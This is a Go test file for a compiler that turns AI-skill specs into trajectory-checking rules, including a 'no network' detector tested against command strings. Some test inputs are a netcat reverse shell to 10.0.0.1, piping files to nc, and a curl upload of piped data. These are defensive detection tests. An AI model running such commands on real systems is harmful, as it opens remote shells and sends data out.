package contract_test

import (
	"bytes"
	"regexp"
	"strings"
	"testing"

	"github.com/skael-dev/skael/internal/eval/contract"
	"github.com/skael-dev/skael/internal/eval/spec"
	"github.com/skael-dev/skael/internal/eval/trajectory"
)

func testSpec() *spec.SkillSpec {
	return &spec.SkillSpec{
		Name:        "pdf-extract",
		Purpose:     "Extract tables.",
		Description: "Extracts tables. Use when a PDF is mentioned.",
		Triggers:    []spec.TriggerPhrase{{Text: "extract tables"}},
		Steps: []spec.Step{
			{ID: "s1", Action: "Run scripts/extract.py on the input.", Postcondition: "out/tables.csv exists."},
			{ID: "s2", Action: "Run scripts/validate.py out/tables.csv.", Postcondition: "exits 0.", Validation: true},
			{ID: "s3", Action: "Summarise the result for the user in a formal tone.", Postcondition: "a summary is produced."},
		},
		Constraints: []spec.Rule{
			{ID: "c1", Text: "Never write outside out/.", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
			{ID: "c2", Text: "Keep the report tone formal.", Kind: spec.RuleMust, Severity: spec.SeverityMinor},
		},
		TargetTier: spec.TierMid,
	}
}

func TestCompile_ScriptStepsBecomeShellMatchers(t *testing.T) {
	c, err := contract.Compile(testSpec())
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	var s1 *contract.StepMatch
	for i := range c.Steps {
		if c.Steps[i].ID == "s1" {
			s1 = &c.Steps[i]
		}
	}
	if s1 == nil {
		t.Fatalf("no matcher compiled for s1: %+v", c.Steps)
	}
	if s1.Match.Type != trajectory.TypeShell {
		t.Errorf("s1 match type = %q, want shell", s1.Match.Type)
	}
	if s1.Match.Pattern == "" {
		t.Error("s1 has no pattern; a shell matcher with no pattern matches every command")
	}
	if !s1.Required {
		t.Error("s1 should be required")
	}
}

func TestCompile_PatternEscapesRegexMetacharacters(t *testing.T) {
	// "scripts/extract.py" contains a '.', which unescaped matches any
	// character — so the matcher would also accept "scripts/extractXpy".
	c, _ := contract.Compile(testSpec())
	for _, s := range c.Steps {
		if s.ID == "s1" && !bytes.Contains([]byte(s.Match.Pattern), []byte(`\.`)) {
			t.Errorf("s1 pattern %q does not escape the dot in the script name", s.Match.Pattern)
		}
	}
}

func TestCompile_OrderingIsDerivedFromStepSequence(t *testing.T) {
	c, _ := contract.Compile(testSpec())
	for _, s := range c.Steps {
		if s.ID == "s2" {
			if len(s.Order.After) == 0 || s.Order.After[0] != "s1" {
				t.Errorf("s2 order = %+v, want after s1", s.Order)
			}
		}
	}
}

func TestCompile_ValidationStepsBecomeCheckpoints(t *testing.T) {
	c, _ := contract.Compile(testSpec())
	if len(c.Checkpoints) != 1 || c.Checkpoints[0] != "s2" {
		t.Errorf("Checkpoints = %v, want [s2]", c.Checkpoints)
	}
}

func TestCompile_MustNotConstraintsBecomeForbidRules(t *testing.T) {
	c, _ := contract.Compile(testSpec())

	if len(c.Forbid) == 0 {
		t.Fatal("no forbid rules compiled from a MUST-NOT constraint")
	}
	f := c.Forbid[0]
	if f.Severity != spec.SeverityCritical {
		t.Errorf("forbid severity = %q, want critical", f.Severity)
	}
	if f.Match.Type != trajectory.TypeFileWrite {
		t.Errorf("forbid match type = %q, want file_write", f.Match.Type)
	}
	if f.Match.PathNotGlob == "" {
		t.Errorf("forbid rule has no path constraint: %+v", f.Match)
	}
}

func TestCompile_UnmatchableStepsAreDemotedToSemantic(t *testing.T) {
	// "Summarise the result in a formal tone" cannot be checked against any
	// normalized event. It must become a semantic rule rather than a step
	// matcher that can never be satisfied — a matcher nothing can satisfy
	// scores every run as a step failure.
	c, _ := contract.Compile(testSpec())

	for _, s := range c.Steps {
		if s.ID == "s3" {
			t.Errorf("unmatchable step s3 compiled to a step matcher: %+v", s)
		}
	}
	var found bool
	for _, sem := range c.Semantic {
		if sem.ID == "s3" {
			found = true
		}
	}
	if !found {
		t.Errorf("s3 was not demoted to a semantic rule: %+v", c.Semantic)
	}
}

func TestCompile_UnverifiableConstraintsBecomeSemantic(t *testing.T) {
	// "Keep the report tone formal" is a MUST with no observable event.
	c, _ := contract.Compile(testSpec())
	for _, f := range c.Forbid {
		if f.ID == "c2" {
			t.Errorf("tone constraint compiled to a forbid rule: %+v", f)
		}
	}
	var found bool
	for _, sem := range c.Semantic {
		if sem.ID == "c2" {
			found = true
		}
	}
	if !found {
		t.Errorf("c2 not demoted to semantic: %+v", c.Semantic)
	}
}

func TestCompile_EveryMatcherIsCheckable(t *testing.T) {
	// The invariant the whole compiler exists to guarantee.
	c, _ := contract.Compile(testSpec())

	checkable := map[trajectory.EventType]bool{
		trajectory.TypeShell: true, trajectory.TypeFileRead: true,
		trajectory.TypeFileWrite: true, trajectory.TypeToolCall: true,
		trajectory.TypeSkillRead: true, trajectory.TypeAskUser: true,
	}
	for _, s := range c.Steps {
		if !checkable[s.Match.Type] {
			t.Errorf("step %s has an uncheckable match type %q", s.ID, s.Match.Type)
		}
	}
	for _, f := range c.Forbid {
		if !checkable[f.Match.Type] {
			t.Errorf("forbid %s has an uncheckable match type %q", f.ID, f.Match.Type)
		}
	}
}

func TestContract_YAMLRoundTrip(t *testing.T) {
	want, _ := contract.Compile(testSpec())

	var buf bytes.Buffer
	if err := want.Save(&buf); err != nil {
		t.Fatalf("Save: %v", err)
	}
	got, err := contract.Load(bytes.NewReader(buf.Bytes()))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	if got.Version != want.Version {
		t.Errorf("Version = %d, want %d", got.Version, want.Version)
	}
	if len(got.Steps) != len(want.Steps) || len(got.Forbid) != len(want.Forbid) ||
		len(got.Semantic) != len(want.Semantic) || len(got.Checkpoints) != len(want.Checkpoints) {
		t.Errorf("round trip lost content: %+v", got)
	}
	if len(got.Forbid) > 0 && got.Forbid[0].Severity != want.Forbid[0].Severity {
		t.Error("forbid severity lost in round trip")
	}
}

// TestContract_YAMLRoundTrip_AllForbidSeverities extends the round-trip check
// beyond the first forbid rule: severity weights ViolationScore later, so a
// wrong or dropped severity mis-scores a run instead of erroring loudly. This
// also asserts Order and Checkpoints survive intact, and is written so that
// misspelling a yaml tag on any of those fields turns it red (proven in the
// implementation report, not re-verified by CI).
func TestContract_YAMLRoundTrip_SeverityOrderCheckpoints(t *testing.T) {
	s := testSpec()
	// Add a second forbid-worthy constraint with a different severity so a
	// single dropped/mis-mapped severity can't hide behind a match on c1.
	s.Constraints = append(s.Constraints, spec.Rule{
		ID:       "c3",
		Text:     "Must not connect to the network.",
		Kind:     spec.RuleMustNot,
		Severity: spec.SeverityMajor,
	})

	want, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	if len(want.Forbid) < 2 {
		t.Fatalf("test setup: expected at least 2 forbid rules, got %+v", want.Forbid)
	}

	var buf bytes.Buffer
	if err := want.Save(&buf); err != nil {
		t.Fatalf("Save: %v", err)
	}
	got, err := contract.Load(bytes.NewReader(buf.Bytes()))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	if len(got.Forbid) != len(want.Forbid) {
		t.Fatalf("Forbid length = %d, want %d", len(got.Forbid), len(want.Forbid))
	}
	for i := range want.Forbid {
		if got.Forbid[i].ID != want.Forbid[i].ID {
			t.Errorf("Forbid[%d].ID = %q, want %q", i, got.Forbid[i].ID, want.Forbid[i].ID)
		}
		if got.Forbid[i].Severity != want.Forbid[i].Severity {
			t.Errorf("Forbid[%d] (%s) severity = %q, want %q", i, want.Forbid[i].ID, got.Forbid[i].Severity, want.Forbid[i].Severity)
		}
	}

	if len(got.Steps) != len(want.Steps) {
		t.Fatalf("Steps length = %d, want %d", len(got.Steps), len(want.Steps))
	}
	for i := range want.Steps {
		if got.Steps[i].Order.Mode != want.Steps[i].Order.Mode {
			t.Errorf("Steps[%d] (%s) Order.Mode = %q, want %q", i, want.Steps[i].ID, got.Steps[i].Order.Mode, want.Steps[i].Order.Mode)
		}
		if len(got.Steps[i].Order.After) != len(want.Steps[i].Order.After) {
			t.Errorf("Steps[%d] (%s) Order.After = %v, want %v", i, want.Steps[i].ID, got.Steps[i].Order.After, want.Steps[i].Order.After)
			continue
		}
		for j := range want.Steps[i].Order.After {
			if got.Steps[i].Order.After[j] != want.Steps[i].Order.After[j] {
				t.Errorf("Steps[%d] (%s) Order.After[%d] = %q, want %q", i, want.Steps[i].ID, j, got.Steps[i].Order.After[j], want.Steps[i].Order.After[j])
			}
		}
	}

	if len(got.Checkpoints) != len(want.Checkpoints) {
		t.Fatalf("Checkpoints = %v, want %v", got.Checkpoints, want.Checkpoints)
	}
	for i := range want.Checkpoints {
		if got.Checkpoints[i] != want.Checkpoints[i] {
			t.Errorf("Checkpoints[%d] = %q, want %q", i, got.Checkpoints[i], want.Checkpoints[i])
		}
	}

	// Round-tripping through the same struct is tautological about the wire
	// format: a struct whose Severity/Order/Checkpoints tags were all
	// renamed identically on encode and decode would still "round-trip"
	// successfully. Assert the raw YAML actually uses the documented,
	// external-facing key names, so a misspelled tag is caught even though
	// Save and Load agree with each other.
	raw := buf.String()
	for _, key := range []string{"severity:", "mode:", "after:", "checkpoints:"} {
		if !strings.Contains(raw, key) {
			t.Errorf("compiled contract YAML missing expected key %q:\n%s", key, raw)
		}
	}
}

// TestContract_IDsArePreservedAndUnique guards a failure mode that would
// otherwise be silent: if two emitted items of the same kind collided on ID,
// a later report would attribute a violation to the wrong rule rather than
// erroring. It uses a spec with several steps and constraints spanning all
// three destinations (step matcher, forbid, semantic) to exercise the ID
// bookkeeping across the whole compiler, not just one classification branch.
func TestContract_IDsArePreservedAndUnique(t *testing.T) {
	s := &spec.SkillSpec{
		Name:        "multi-step",
		Purpose:     "Do several things.",
		Description: "Does several things across steps.",
		Triggers:    []spec.TriggerPhrase{{Text: "do several things"}},
		Steps: []spec.Step{
			{ID: "step-a", Action: "Run scripts/one.py on the input.", Postcondition: "out/one.csv exists."},
			{ID: "step-b", Action: "Write out/report.json with the results.", Postcondition: "out/report.json exists."},
			{ID: "step-c", Action: "Read config/settings.yaml for options.", Postcondition: "settings are loaded."},
			{ID: "step-d", Action: "Run scripts/two.py to validate.", Postcondition: "exits 0.", Validation: true},
			{ID: "step-e", Action: "Politely thank the user for their patience.", Postcondition: "user feels thanked."},
		},
		Constraints: []spec.Rule{
			{ID: "rule-1", Text: "Never write outside out/.", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
			{ID: "rule-2", Text: "Must not connect to the network.", Kind: spec.RuleMustNot, Severity: spec.SeverityMajor},
			{ID: "rule-3", Text: "Always be polite to the user.", Kind: spec.RuleMust, Severity: spec.SeverityMinor},
		},
		TargetTier: spec.TierMid,
	}

	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	assertUnique := func(kind string, ids []string, wantIDs map[string]bool) {
		seen := make(map[string]bool)
		for _, id := range ids {
			if id == "" {
				t.Errorf("%s: empty ID emitted", kind)
				continue
			}
			if seen[id] {
				t.Errorf("%s: duplicate ID %q", kind, id)
			}
			seen[id] = true
			if !wantIDs[id] {
				t.Errorf("%s: unexpected ID %q not derived from any source step/constraint", kind, id)
			}
		}
	}

	stepIDs := make(map[string]bool)
	for _, st := range s.Steps {
		stepIDs[st.ID] = true
	}
	constraintIDs := make(map[string]bool)
	for _, cn := range s.Constraints {
		constraintIDs[cn.ID] = true
	}
	allIDs := make(map[string]bool)
	for id := range stepIDs {
		allIDs[id] = true
	}
	for id := range constraintIDs {
		allIDs[id] = true
	}

	var stepMatchIDs, forbidIDs, semanticIDs []string
	for _, sm := range c.Steps {
		stepMatchIDs = append(stepMatchIDs, sm.ID)
	}
	for _, f := range c.Forbid {
		forbidIDs = append(forbidIDs, f.ID)
	}
	for _, sem := range c.Semantic {
		semanticIDs = append(semanticIDs, sem.ID)
	}

	assertUnique("StepMatch", stepMatchIDs, allIDs)
	assertUnique("ForbidMatch", forbidIDs, allIDs)
	assertUnique("SemanticRule", semanticIDs, allIDs)

	// Every source step and constraint must be accounted for exactly once
	// across the three destinations (no item vanishes, none is duplicated
	// across destinations).
	occurrences := make(map[string]int)
	for _, id := range stepMatchIDs {
		occurrences[id]++
	}
	for _, id := range forbidIDs {
		occurrences[id]++
	}
	for _, id := range semanticIDs {
		occurrences[id]++
	}
	for id := range allIDs {
		if occurrences[id] != 1 {
			t.Errorf("source id %q appears %d times across Steps/Forbid/Semantic, want exactly 1", id, occurrences[id])
		}
	}
}

// TestCompile_ObservableMustBecomesRequiredStepMatch closes the asymmetry an
// earlier pass of this compiler had: a MUST-NOT naming an observable action
// got a deterministic ForbidMatch, but every MUST — even one naming a
// plainly observable action like running a script — was demoted to a
// judge-scored SemanticRule. An observable MUST must instead become a
// required StepMatch with no ordering claim (Order.Mode: "any"): a positive
// obligation has to be observed somewhere in the trajectory, not tied to a
// particular point in the step sequence.
func TestCompile_ObservableMustBecomesRequiredStepMatch(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "must-example",
		Steps: []spec.Step{
			{ID: "s1", Action: "Run scripts/extract.py on the input.", Postcondition: "out/tables.csv exists."},
		},
		Constraints: []spec.Rule{
			{ID: "c-validate", Text: "Always run scripts/validate.py before finishing.", Kind: spec.RuleMust, Severity: spec.SeverityMajor},
		},
	}

	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	var got *contract.StepMatch
	for i := range c.Steps {
		if c.Steps[i].ID == "c-validate" {
			got = &c.Steps[i]
		}
	}
	if got == nil {
		t.Fatalf("observable MUST c-validate was not compiled to a step matcher: %+v", c.Steps)
	}
	if got.Match.Type != trajectory.TypeShell {
		t.Errorf("c-validate match type = %q, want shell", got.Match.Type)
	}
	if got.Match.Pattern == "" {
		t.Error("c-validate has no pattern; a shell matcher with no pattern matches every command")
	}
	if !strings.Contains(got.Match.Pattern, `\.`) {
		t.Errorf("c-validate pattern %q does not escape the dot in the script name", got.Match.Pattern)
	}
	if !got.Required {
		t.Error("c-validate should be required")
	}
	if got.Order.Mode != "any" {
		t.Errorf("c-validate Order.Mode = %q, want %q (a MUST is not tied to step sequence)", got.Order.Mode, "any")
	}
	if len(got.Order.After) != 0 {
		t.Errorf("c-validate Order.After = %v, want empty", got.Order.After)
	}

	for _, f := range c.Forbid {
		if f.ID == "c-validate" {
			t.Errorf("observable MUST compiled to a forbid rule instead of a step matcher: %+v", f)
		}
	}
	for _, sem := range c.Semantic {
		if sem.ID == "c-validate" {
			t.Errorf("observable MUST was demoted to semantic: %+v", sem)
		}
	}
}

// TestCompile_UnobservableMustStaysSemantic guards the other side of the same
// fix: a MUST with no observable event (a tone requirement) must still be
// demoted to SemanticRule, exactly as before — reusing classifyStep for MUST
// constraints must not accidentally invent a matcher for something that was
// correctly unmatchable.
func TestCompile_UnobservableMustStaysSemantic(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "must-example-unobservable",
		Constraints: []spec.Rule{
			{ID: "c-tone", Text: "Keep the report tone formal.", Kind: spec.RuleMust, Severity: spec.SeverityMinor},
		},
	}

	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	for _, sm := range c.Steps {
		if sm.ID == "c-tone" {
			t.Errorf("unobservable MUST compiled to a step matcher: %+v", sm)
		}
	}
	var found bool
	for _, sem := range c.Semantic {
		if sem.ID == "c-tone" {
			found = true
		}
	}
	if !found {
		t.Errorf("unobservable MUST c-tone was not demoted to semantic: %+v", c.Semantic)
	}
}

// TestCompile_MustNotStillBecomesForbid re-confirms, after adding the MUST
// path, that MUST-NOT is unaffected: it must still compile to a ForbidMatch,
// never a StepMatch.
func TestCompile_MustNotStillBecomesForbid(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "must-not-example",
		Constraints: []spec.Rule{
			{ID: "c-scope", Text: "Never write outside out/.", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
		},
	}

	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	if len(c.Forbid) != 1 || c.Forbid[0].ID != "c-scope" {
		t.Fatalf("MUST-NOT did not compile to a forbid rule: %+v", c.Forbid)
	}
	for _, sm := range c.Steps {
		if sm.ID == "c-scope" {
			t.Errorf("MUST-NOT compiled to a step matcher instead of a forbid rule: %+v", sm)
		}
	}
}

// TestCompile_ConstraintIDCollidingWithStepIDIsAnError is the cross-kind
// collision guard: once a MUST constraint can also land in c.Steps, a
// constraint ID that collides with a step ID must not be silently merged or
// silently overwritten — either of which would let a later report attribute
// a violation to the wrong rule. Compile must fail loudly instead.
func TestCompile_ConstraintIDCollidingWithStepIDIsAnError(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "colliding-ids",
		Steps: []spec.Step{
			{ID: "shared", Action: "Run scripts/extract.py on the input.", Postcondition: "out/tables.csv exists."},
		},
		Constraints: []spec.Rule{
			{ID: "shared", Text: "Always run scripts/validate.py before finishing.", Kind: spec.RuleMust, Severity: spec.SeverityMajor},
		},
	}

	c, err := contract.Compile(s)
	if err == nil {
		t.Fatalf("Compile: want an error for a constraint id colliding with a step id, got contract %+v", c)
	}
	if !strings.Contains(err.Error(), "shared") {
		t.Errorf("Compile error %q does not name the colliding id", err.Error())
	}
}

// TestCompile_ConstraintIDCollidingWithConstraintIDIsAnError extends the
// collision guard to two constraints sharing an ID (not just a step and a
// constraint) — the same silent-merge risk applies within Constraints alone.
func TestCompile_ConstraintIDCollidingWithConstraintIDIsAnError(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "colliding-constraint-ids",
		Constraints: []spec.Rule{
			{ID: "dup", Text: "Never write outside out/.", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
			{ID: "dup", Text: "Must not connect to the network.", Kind: spec.RuleMustNot, Severity: spec.SeverityMajor},
		},
	}

	c, err := contract.Compile(s)
	if err == nil {
		t.Fatalf("Compile: want an error for two constraints sharing id %q, got contract %+v", "dup", c)
	}
}

// TestClassifyForbid_PathScopeTrimsTrailingPunctuation pins the path-scope
// trim as its own behavior, not just an implementation detail: "outside X"
// must yield PathNotGlob "X/**" regardless of whether the sentence attaches
// a trailing period, a trailing slash, both, or neither directly to X. This
// is inference beyond the brief's literal text (only one case, "out/.", was
// given), so it needs its own coverage or a future edit could "simplify" the
// trim and silently produce an inert glob like "out//**" or "out/./**".
func TestClassifyForbid_PathScopeTrimsTrailingPunctuation(t *testing.T) {
	cases := []struct {
		name string
		text string
		want string
	}{
		{"trailing dot", "Never write outside out.", "out/**"},
		{"trailing slash", "Never write outside out/ ever.", "out/**"},
		{"trailing dot and slash", "Never write outside out/.", "out/**"},
		{"neither", "Never write outside out and nowhere else.", "out/**"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := &spec.SkillSpec{
				Name: "path-scope-trim",
				Constraints: []spec.Rule{
					{ID: "c1", Text: tc.text, Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
				},
			}
			c, err := contract.Compile(s)
			if err != nil {
				t.Fatalf("Compile: %v", err)
			}
			if len(c.Forbid) != 1 {
				t.Fatalf("expected exactly one forbid rule, got %+v (semantic: %+v)", c.Forbid, c.Semantic)
			}
			if got := c.Forbid[0].Match.PathNotGlob; got != tc.want {
				t.Errorf("PathNotGlob = %q, want %q (from text %q)", got, tc.want, tc.text)
			}
		})
	}
}

// TestClassifyForbid_PathScopeGlobActuallyMatches goes one step further than
// asserting the glob's string form: it proves the compiled PathNotGlob
// behaves correctly against real paths, at any nesting depth, using this
// package's own contract.MatchPath — never path/filepath.Match directly,
// which treats "**" as two non-recursive stars and would wrongly call
// "out/tables/q1.csv" a violation of a "stay inside out/" rule.
//
// A path violates a PathNotGlob rule when it does NOT match the glob (the
// rule says "nothing outside X", so anything outside X is the violation).
func TestClassifyForbid_PathScopeGlobActuallyMatches(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "path-scope-glob-match",
		Constraints: []spec.Rule{
			{ID: "c1", Text: "Never write outside out/.", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
		},
	}
	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	if len(c.Forbid) != 1 {
		t.Fatalf("expected exactly one forbid rule, got %+v", c.Forbid)
	}
	glob := c.Forbid[0].Match.PathNotGlob

	cases := []struct {
		path        string
		wantViolate bool
	}{
		{"out/tables.csv", false},
		// The case Go's stdlib filepath.Match gets wrong: nested under out/,
		// still fully in scope, must NOT be a violation.
		{"out/tables/q1.csv", false},
		{"out/a/b/c.csv", false},
		{"tmp/x.csv", true},
	}
	for _, tc := range cases {
		matched, err := contract.MatchPath(glob, tc.path)
		if err != nil {
			t.Fatalf("MatchPath(%q, %q): %v", glob, tc.path, err)
		}
		violated := !matched
		if violated != tc.wantViolate {
			t.Errorf("path %q: violated = %v, want %v (glob %q, matched = %v)", tc.path, violated, tc.wantViolate, glob, matched)
		}
	}
}

// TestClassifyStep_BundlePathStopsAtSentencePunctuation covers an action
// written as ordinary English. The trailing period ends the sentence, not the
// path, and a matcher that requires a literal "." after ".md" can never be
// satisfied by any observed command.
func TestClassifyStep_BundlePathStopsAtSentencePunctuation(t *testing.T) {
	cases := []struct {
		action  string
		command string
	}{
		{"Read references/style-guide.md.", "cat references/style-guide.md"},
		{"Apply assets/report.tmpl.", `python3 -c 'open("assets/report.tmpl")'`},
		{"Run scripts/extract.py, then stop.", "python3 scripts/extract.py in.pdf"},
		{"Read references/notes.md; then continue.", "cat references/notes.md"},
	}
	for _, tc := range cases {
		s := &spec.SkillSpec{
			Name:  "punctuated",
			Steps: []spec.Step{{ID: "s1", Action: tc.action, Postcondition: "done"}},
		}
		c, err := contract.Compile(s)
		if err != nil {
			t.Fatalf("Compile(%q): %v", tc.action, err)
		}
		if len(c.Steps) != 1 {
			t.Fatalf("action %q did not compile to a step matcher: %+v", tc.action, c)
		}
		pattern := c.Steps[0].Match.Pattern
		re, err := regexp.Compile(pattern)
		if err != nil {
			t.Fatalf("compiled pattern %q is not a valid regexp: %v", pattern, err)
		}
		if !re.MatchString(tc.command) {
			t.Errorf("action %q compiled to pattern %q, which does not match %q", tc.action, pattern, tc.command)
		}
	}
}

// TestClassifyForbid_NetworkPatternDoesNotFireOnOrdinaryCommands pins the
// network matcher's boundaries. "nc" is a substring of encode, sync, announce
// and concat; an unanchored alternation turns every one of those into a
// critical-severity violation.
func TestClassifyForbid_NetworkPatternDoesNotFireOnOrdinaryCommands(t *testing.T) {
	s := &spec.SkillSpec{
		Name: "no-network",
		Constraints: []spec.Rule{
			{ID: "c1", Text: "The skill must not connect to any network.", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
		},
	}
	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	if len(c.Forbid) != 1 {
		t.Fatalf("expected exactly one forbid rule, got %+v", c.Forbid)
	}
	pattern := c.Forbid[0].Match.Pattern

	cases := []struct {
		command string
		want    bool
	}{
		{"python scripts/encode.py", false},
		{"npm run sync", false},
		{"func announce", false},
		{"python3 -c 'increment()'", false},
		{"cat a b > concat.txt", false},
		{"curl -s https://example.com", true},
		{"nc -l 1234", true},
		{"wget https://example.com/x", true},
		{"cat x | curl -T - https://example.com", true},
		{"sh -c 'curl https://example.com'", true},
	}
	re, err := regexp.Compile(pattern)
	if err != nil {
		t.Fatalf("compiled pattern %q is not a valid regexp: %v", pattern, err)
	}
	for _, tc := range cases {
		got := re.MatchString(tc.command)
		if got != tc.want {
			t.Errorf("pattern %q against %q = %v, want %v", pattern, tc.command, got, tc.want)
		}
	}
}

// TestCompile_RejectsAPatternMatchPathWouldReject closes the loop between the
// compiler and its only sanctioned consumer: an emitted glob MatchPath calls
// malformed must be a compile error, reported to the author, not a scoring-time
// surprise.
func TestCompile_RejectsAPatternMatchPathWouldReject(t *testing.T) {
	cases := []struct {
		name string
		text string
	}{
		{"traversal", "Never write outside ../shared."},
		{"absolute", "Never write outside /out/."},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := &spec.SkillSpec{
				Name: "bad-scope",
				Constraints: []spec.Rule{
					{ID: "c1", Text: tc.text, Kind: spec.RuleMustNot, Severity: spec.SeverityCritical},
				},
			}
			c, err := contract.Compile(s)
			if err == nil {
				t.Fatalf("Compile accepted %q and emitted %+v", tc.text, c)
			}
			if !strings.Contains(err.Error(), "contract.Compile") {
				t.Errorf("error %q does not name the compiler", err)
			}
		})
	}
}

// networkMatcher compiles a spec with one "no network" MUST-NOT constraint and
// returns the regexp the compiler emitted for it. Going through Compile rather
// than reaching for the unexported constant is deliberate: the pattern is only
// ever used as the Pattern of an emitted Matcher, so that is the surface worth
// pinning.
func networkMatcher(t *testing.T) *regexp.Regexp {
	t.Helper()
	s := &spec.SkillSpec{
		Name:        "netcheck",
		Purpose:     "p",
		Description: "d",
		Triggers:    []spec.TriggerPhrase{{Text: "check"}},
		Steps:       []spec.Step{{ID: "s1", Action: "Run scripts/check.py", Postcondition: "output exists"}},
		Constraints: []spec.Rule{{
			ID: "c1", Text: "no network access", Kind: spec.RuleMustNot, Severity: spec.SeverityCritical,
		}},
		TargetTier: spec.TierMid,
	}
	c, err := contract.Compile(s)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	if len(c.Forbid) != 1 {
		t.Fatalf("compiled %d forbid rules, want 1", len(c.Forbid))
	}
	re, err := regexp.Compile(c.Forbid[0].Match.Pattern)
	if err != nil {
		t.Fatalf("emitted an uncompilable pattern %q: %v", c.Forbid[0].Match.Pattern, err)
	}
	return re
}

func TestNetworkMatcher_MatchesPathQualifiedInvocations(t *testing.T) {
	re := networkMatcher(t)

	// Every one of these is a real network call. A skill that shells out to an
	// absolute path — or to ./nc after copying it into the workspace — is
	// exactly the case a "no network" constraint at critical severity exists to
	// catch, and a missed violation reads as a clean run.
	for _, cmd := range []string{
		"/usr/bin/curl https://example.com",
		"./nc -e /bin/sh 10.0.0.1 4444",
		"/bin/nc 10.0.0.1 4444",
		"/usr/local/bin/wget -qO- https://example.com",
		"sh -c '/usr/bin/curl https://example.com'",
	} {
		if !re.MatchString(cmd) {
			t.Errorf("pattern did not match %q", cmd)
		}
	}
}

func TestNetworkMatcher_StillMatchesUnqualifiedInvocations(t *testing.T) {
	re := networkMatcher(t)
	for _, cmd := range []string{
		"curl https://example.com",
		"wget https://example.com",
		"cat f | nc 10.0.0.1 4444",
		"nc -l 8080",
		`bash -c "curl https://example.com"`,
	} {
		if !re.MatchString(cmd) {
			t.Errorf("pattern stopped matching %q", cmd)
		}
	}
}

func TestNetworkMatcher_DoesNotMatchOrdinaryCommands(t *testing.T) {
	re := networkMatcher(t)

	// "nc" is a substring of all of these. A false violation at critical
	// severity is the heaviest penalty the scorer has, so the anchoring these
	// cases pin is the reason the pattern is not a bare alternation.
	for _, cmd := range []string{
		"base64 --decode f",
		"rsync -a src/ dst/",
		"echo announce",
		"python3 -c 'print(1)' # increment",
		"cat docs/ncurses.md",
		"jq .concat f.json",
		"npm run sync",
		"cd /usr/bin/encode && ls",
	} {
		if re.MatchString(cmd) {
			t.Errorf("pattern matched ordinary command %q", cmd)
		}
	}
}
